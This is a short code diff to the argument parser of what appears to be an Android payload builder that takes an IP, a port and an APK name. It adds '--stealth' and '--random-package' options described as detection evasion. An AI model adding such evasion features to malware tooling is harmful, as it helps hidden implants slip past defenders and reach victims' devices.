@@ -38,6 +38,8 @@ parser.add_argument('-i','--ip',metavar="<IP>" ,type=str,help='Enter the IP')
 parser.add_argument('-p','--port',metavar="<Port>", type=str,help='Enter the Port')
 parser.add_argument('-o','--output',metavar="<Apk Name>", type=str,help='Enter the apk Name')
 parser.add_argument('-icon','--icon',help='Visible Icon',action='store_true')
+parser.add_argument('--stealth',help='Enable maximum stealth mode with detection evasion',action='store_true')
+parser.add_argument('--random-package',help='Use random package name for evasion',action='store_true')
 args = parser.parse_args()
 
 
